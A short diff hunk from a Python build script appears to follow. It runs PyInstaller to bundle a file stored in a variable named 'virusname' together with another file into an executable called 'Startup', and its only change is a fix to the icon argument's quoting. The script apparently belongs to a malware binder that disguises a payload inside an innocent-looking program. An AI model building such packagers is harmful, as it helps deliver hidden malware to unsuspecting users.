@@ -53,7 +53,7 @@ PyInstaller.__main__.run([
     '--name=Startup',  
     f'--add-data={virusname};.', 
     f'--add-data={file};.', 
-    '--icon="ico.ico"',
+    '--icon=ico.ico',
     'code.py'
 ])
 print("[*]Hazır....")
